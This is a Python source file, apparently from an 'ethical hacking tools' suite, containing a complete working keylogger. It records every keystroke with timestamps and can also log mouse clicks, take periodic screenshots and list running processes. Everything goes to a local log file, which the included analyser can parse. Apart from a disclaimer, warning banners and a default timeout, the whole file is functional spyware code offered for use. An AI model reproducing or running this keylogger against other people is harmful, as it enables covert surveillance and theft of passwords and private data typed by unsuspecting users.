#!/usr/bin/env python3
"""
Keylogger - Ethical Hacking Tools Suite
Educational and Testing Purposes Only

WARNING: This tool is for educational and ethical testing purposes only.
Use only on systems you own or have explicit permission to test.
Unauthorized use may violate laws and regulations.

Features:
- Capture keystrokes
- Log to file
- Screenshot capture
- Process monitoring
- Network activity monitoring
"""

import os
import sys
import time
import threading
import datetime
import json
import argparse
from pathlib import Path

try:
    from pynput import keyboard, mouse
    from pynput.keyboard import Key, Listener as KeyboardListener
    from pynput.mouse import Listener as MouseListener
    PYNPUT_AVAILABLE = True
except ImportError:
    PYNPUT_AVAILABLE = False
    print("[!] Warning: pynput not available. Keylogger functionality disabled.")

try:
    import keyboard as kb
    KEYBOARD_AVAILABLE = True
except ImportError:
    KEYBOARD_AVAILABLE = False
    print("[!] Warning: keyboard library not available. Some features disabled.")

try:
    from PIL import ImageGrab
    PIL_AVAILABLE = True
except ImportError:
    PIL_AVAILABLE = False
    print("[!] Warning: PIL not available. Screenshot functionality disabled.")

import psutil

from ethical_hacking_tools.utils.logger import setup_logger, log_security_event

class Keylogger:
    """
    Educational keylogger for demonstrating security risks
    """
    
    def __init__(self):
        self.logger = setup_logger('keylogger')
        self.is_running = False
        self.start_time = None
        self.keystrokes = []
        self.mouse_clicks = []
        self.screenshots = []
        
        # Configuration
        self.log_file = None
        self.capture_screenshots = False
        self.capture_mouse = False
        self.capture_processes = False
        
        # Statistics
        self.total_keystrokes = 0
        self.total_clicks = 0
        self.total_screenshots = 0
        
        # Buffer for keystrokes
        self.key_buffer = []
        self.buffer_size = 50
        
        print("[!] WARNING: This keylogger is for educational purposes only!")
        print("[!] Use only on systems you own or have explicit permission to test!")
        print("[!] Unauthorized use may violate laws and regulations!")
    
    def on_key_press(self, key):
        """
        Handle key press events
        """
        try:
            # Convert key to string
            if hasattr(key, 'char') and key.char is not None:
                key_str = key.char
            else:
                key_str = str(key).replace('Key.', '')
            
            # Add to buffer
            self.key_buffer.append({
                'timestamp': datetime.datetime.now().isoformat(),
                'key': key_str,
                'action': 'press'
            })
            
            self.total_keystrokes += 1
            
            # Write to file if buffer is full
            if len(self.key_buffer) >= self.buffer_size:
                self.flush_buffer()
            
            # Log special keys
            if key_str in ['enter', 'space', 'tab', 'backspace', 'delete']:
                self.logger.debug(f"Special key pressed: {key_str}")
            
        except Exception as e:
            self.logger.error(f"Error handling key press: {e}")
    
    def on_key_release(self, key):
        """
        Handle key release events
        """
        try:
            # Convert key to string
            if hasattr(key, 'char') and key.char is not None:
                key_str = key.char
            else:
                key_str = str(key).replace('Key.', '')
            
            # Add to buffer
            self.key_buffer.append({
                'timestamp': datetime.datetime.now().isoformat(),
                'key': key_str,
                'action': 'release'
            })
            
            # Check for exit combination (Ctrl+Shift+Q)
            if (key == Key.shift_l or key == Key.shift_r) and \
               len(self.key_buffer) >= 2 and \
               any(k['key'] == 'ctrl_l' or k['key'] == 'ctrl_r' for k in self.key_buffer[-3:]) and \
               any(k['key'] == 'q' for k in self.key_buffer[-3:]):
                print("\n[!] Exit combination detected (Ctrl+Shift+Q)")
                self.stop()
            
        except Exception as e:
            self.logger.error(f"Error handling key release: {e}")
    
    def on_mouse_click(self, x, y, button, pressed):
        """
        Handle mouse click events
        """
        if not self.capture_mouse:
            return
        
        try:
            click_data = {
                'timestamp': datetime.datetime.now().isoformat(),
                'x': x,
                'y': y,
                'button': str(button),
                'pressed': pressed
            }
            
            self.mouse_clicks.append(click_data)
            self.total_clicks += 1
            
            if pressed:
                self.logger.debug(f"Mouse click: {button} at ({x}, {y})")
        
        except Exception as e:
            self.logger.error(f"Error handling mouse click: {e}")
    
    def capture_screenshot(self):
        """
        Capture screenshot
        """
        if not PIL_AVAILABLE or not self.capture_screenshots:
            return
        
        try:
            screenshot = ImageGrab.grab()
            timestamp = datetime.datetime.now().strftime('%Y%m%d_%H%M%S')
            filename = f"screenshot_{timestamp}.png"
            
            # Save screenshot
            screenshot.save(filename)
            
            screenshot_data = {
                'timestamp': datetime.datetime.now().isoformat(),
                'filename': filename,
                'size': screenshot.size
            }
            
            self.screenshots.append(screenshot_data)
            self.total_screenshots += 1
            
            self.logger.info(f"Screenshot captured: {filename}")
        
        except Exception as e:
            self.logger.error(f"Error capturing screenshot: {e}")
    
    def monitor_processes(self):
        """
        Monitor running processes
        """
        if not self.capture_processes:
            return
        
        try:
            processes = []
            for proc in psutil.process_iter(['pid', 'name', 'cpu_percent', 'memory_percent']):
                try:
                    processes.append(proc.info)
                except (psutil.NoSuchProcess, psutil.AccessDenied):
                    continue
            
            process_data = {
                'timestamp': datetime.datetime.now().isoformat(),
                'processes': processes,
                'count': len(processes)
            }
            
            # Log to file
            if self.log_file:
                with open(self.log_file, 'a', encoding='utf-8') as f:
                    f.write(f"PROCESS_MONITOR: {json.dumps(process_data)}\n")
        
        except Exception as e:
            self.logger.error(f"Error monitoring processes: {e}")
    
    def flush_buffer(self):
        """
        Flush keystroke buffer to file
        """
        if not self.key_buffer or not self.log_file:
            return
        
        try:
            with open(self.log_file, 'a', encoding='utf-8') as f:
                for keystroke in self.key_buffer:
                    f.write(f"KEYSTROKE: {json.dumps(keystroke)}\n")
            
            self.key_buffer.clear()
        
        except Exception as e:
            self.logger.error(f"Error flushing buffer: {e}")
    
    def start(self, output_file='keystrokes.log', timeout=60, 
              capture_screenshots=False, capture_mouse=False, capture_processes=False):
        """
        Start the keylogger
        """
        if not PYNPUT_AVAILABLE:
            print("[!] Error: pynput not available. Cannot start keylogger.")
            return False
        
        print(f"\n[+] Starting keylogger...")
        print(f"[+] Output file: {output_file}")
        print(f"[+] Timeout: {timeout} seconds")
        print(f"[+] Screenshots: {'Yes' if capture_screenshots else 'No'}")
        print(f"[+] Mouse capture: {'Yes' if capture_mouse else 'No'}")
        print(f"[+] Process monitoring: {'Yes' if capture_processes else 'No'}")
        print(f"[+] Press Ctrl+Shift+Q to stop")
        print("-" * 50)
        
        # Setup configuration
        self.log_file = output_file
        self.capture_screenshots = capture_screenshots
        self.capture_mouse = capture_mouse
        self.capture_processes = capture_processes
        
        # Clear previous data
        self.keystrokes = []
        self.mouse_clicks = []
        self.screenshots = []
        self.key_buffer = []
        
        # Initialize counters
        self.total_keystrokes = 0
        self.total_clicks = 0
        self.total_screenshots = 0
        
        # Start time
        self.start_time = time.time()
        self.is_running = True
        
        # Create log file header
        try:
            with open(self.log_file, 'w', encoding='utf-8') as f:
                f.write(f"KEYLOGGER SESSION STARTED: {datetime.datetime.now().isoformat()}\n")
                f.write(f"TIMEOUT: {timeout} seconds\n")
                f.write(f"CONFIG: screenshots={capture_screenshots}, mouse={capture_mouse}, processes={capture_processes}\n")
                f.write("-" * 50 + "\n")
        except Exception as e:
            self.logger.error(f"Error creating log file: {e}")
            return False
        
        # Start listeners
        try:
            # Keyboard listener
            keyboard_listener = KeyboardListener(
                on_press=self.on_key_press,
                on_release=self.on_key_release
            )
            keyboard_listener.start()
            
            # Mouse listener (if enabled)
            mouse_listener = None
            if self.capture_mouse:
                mouse_listener = MouseListener(
                    on_click=self.on_mouse_click
                )
                mouse_listener.start()
            
            # Log security event
            log_security_event(
                self.logger,
                'keylogger_started',
                'system',
                f"Output: {output_file}, Timeout: {timeout}s"
            )
            
            print("[+] Keylogger started successfully!")
            print("[+] Capturing keystrokes...")
            
            # Main loop
            screenshot_interval = 30  # Screenshots every 30 seconds
            process_interval = 60     # Process monitoring every 60 seconds
            last_screenshot = time.time()
            last_process_check = time.time()
            
            while self.is_running:
                current_time = time.time()
                
                # Check timeout
                if timeout > 0 and (current_time - self.start_time) >= timeout:
                    print(f"\n[!] Timeout reached ({timeout} seconds)")
                    break
                
                # Capture screenshot if enabled
                if self.capture_screenshots and (current_time - last_screenshot) >= screenshot_interval:
                    self.capture_screenshot()
                    last_screenshot = current_time
                
                # Monitor processes if enabled
                if self.capture_processes and (current_time - last_process_check) >= process_interval:
                    self.monitor_processes()
                    last_process_check = current_time
                
                # Flush buffer periodically
                if len(self.key_buffer) > 0:
                    self.flush_buffer()
                
                time.sleep(0.1)  # Small delay to prevent high CPU usage
            
            # Stop listeners
            keyboard_listener.stop()
            if mouse_listener:
                mouse_listener.stop()
            
            # Final flush
            self.flush_buffer()
            
            # Write session summary
            self.write_session_summary()
            
            return True
        
        except KeyboardInterrupt:
            print(f"\n[!] Keylogger interrupted by user")
            self.stop()
            return False
        except Exception as e:
            self.logger.error(f"Error starting keylogger: {e}")
            print(f"[!] Error: {e}")
            return False
    
    def stop(self):
        """
        Stop the keylogger
        """
        print(f"\n[!] Stopping keylogger...")
        self.is_running = False
        
        # Log security event
        log_security_event(
            self.logger,
            'keylogger_stopped',
            'system',
            f"Duration: {time.time() - self.start_time:.2f}s"
        )
    
    def write_session_summary(self):
        """
        Write session summary to log file
        """
        if not self.log_file:
            return
        
        try:
            duration = time.time() - self.start_time if self.start_time else 0
            
            with open(self.log_file, 'a', encoding='utf-8') as f:
                f.write("-" * 50 + "\n")
                f.write(f"KEYLOGGER SESSION ENDED: {datetime.datetime.now().isoformat()}\n")
                f.write(f"DURATION: {duration:.2f} seconds\n")
                f.write(f"TOTAL KEYSTROKES: {self.total_keystrokes}\n")
                f.write(f"TOTAL MOUSE CLICKS: {self.total_clicks}\n")
                f.write(f"TOTAL SCREENSHOTS: {self.total_screenshots}\n")
                f.write(f"KEYSTROKES PER SECOND: {self.total_keystrokes / duration if duration > 0 else 0:.2f}\n")
        
        except Exception as e:
            self.logger.error(f"Error writing session summary: {e}")
    
    def analyze_log(self, log_file):
        """
        Analyze keylogger log file
        """
        if not os.path.exists(log_file):
            print(f"[!] Error: Log file '{log_file}' not found")
            return
        
        print(f"\n[+] Analyzing keylogger log: {log_file}")
        
        try:
            keystrokes = []
            mouse_clicks = []
            screenshots = []
            
            with open(log_file, 'r', encoding='utf-8') as f:
                for line in f:
                    if line.startswith('KEYSTROKE:'):
                        data = json.loads(line[10:])
                        keystrokes.append(data)
                    elif line.startswith('MOUSE_CLICK:'):
                        data = json.loads(line[12:])
                        mouse_clicks.append(data)
                    elif line.startswith('SCREENSHOT:'):
                        data = json.loads(line[11:])
                        screenshots.append(data)
            
            # Analysis
            print(f"\nANALYSIS RESULTS:")
            print(f"-" * 30)
            print(f"Total keystrokes: {len(keystrokes)}")
            print(f"Total mouse clicks: {len(mouse_clicks)}")
            print(f"Total screenshots: {len(screenshots)}")
            
            # Most pressed keys
            key_counts = {}
            for ks in keystrokes:
                if ks['action'] == 'press':
                    key = ks['key']
                    key_counts[key] = key_counts.get(key, 0) + 1
            
            if key_counts:
                most_pressed = sorted(key_counts.items(), key=lambda x: x[1], reverse=True)[:10]
                print(f"\nMost pressed keys:")
                for key, count in most_pressed:
                    print(f"  {key}: {count}")
            
            # Activity timeline
            if keystrokes:
                start_time = datetime.datetime.fromisoformat(keystrokes[0]['timestamp'])
                end_time = datetime.datetime.fromisoformat(keystrokes[-1]['timestamp'])
                duration = (end_time - start_time).total_seconds()
                print(f"\nActivity duration: {duration:.2f} seconds")
                print(f"Average keystrokes per second: {len(keystrokes) / duration:.2f}")
        
        except Exception as e:
            self.logger.error(f"Error analyzing log: {e}")
            print(f"[!] Error analyzing log: {e}")

def main():
    """
    Command line interface for Keylogger
    """
    parser = argparse.ArgumentParser(description='Keylogger - Ethical Hacking Tools (Educational Only)')
    parser.add_argument('-o', '--output', default='keystrokes.log', help='Output log file')
    parser.add_argument('-t', '--timeout', type=int, default=60, help='Timeout in seconds')
    parser.add_argument('-s', '--screenshots', action='store_true', help='Capture screenshots')
    parser.add_argument('-m', '--mouse', action='store_true', help='Capture mouse clicks')
    parser.add_argument('-p', '--processes', action='store_true', help='Monitor processes')
    parser.add_argument('-a', '--analyze', help='Analyze existing log file')
    
    args = parser.parse_args()
    
    if not PYNPUT_AVAILABLE:
        print("[!] Error: pynput library not available.")
        print("[!] Install with: pip install pynput")
        return
    
    keylogger = Keylogger()
    
    if args.analyze:
        keylogger.analyze_log(args.analyze)
    else:
        keylogger.start(
            args.output,
            args.timeout,
            args.screenshots,
            args.mouse,
            args.processes
        )

if __name__ == "__main__":
    main()
